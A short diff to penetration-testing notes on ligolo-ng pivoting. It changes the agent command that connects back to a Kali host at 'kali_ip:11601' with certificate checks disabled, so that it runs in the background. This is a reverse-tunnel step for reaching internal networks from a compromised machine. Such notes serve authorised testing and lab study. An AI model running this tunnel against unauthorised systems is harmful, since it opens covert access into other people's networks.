@@ -35,7 +35,7 @@ cd /opt/ligolo-ng
 https://github.com/nicocha30/ligolo-ng/releases
 
 ```bash
-./agent -connect kali_ip:11601 -ignore-cert
+./agent -connect kali_ip:11601 -ignore-cert &
 ```
 
 ## Adding a new route on Proxy Server (kali)
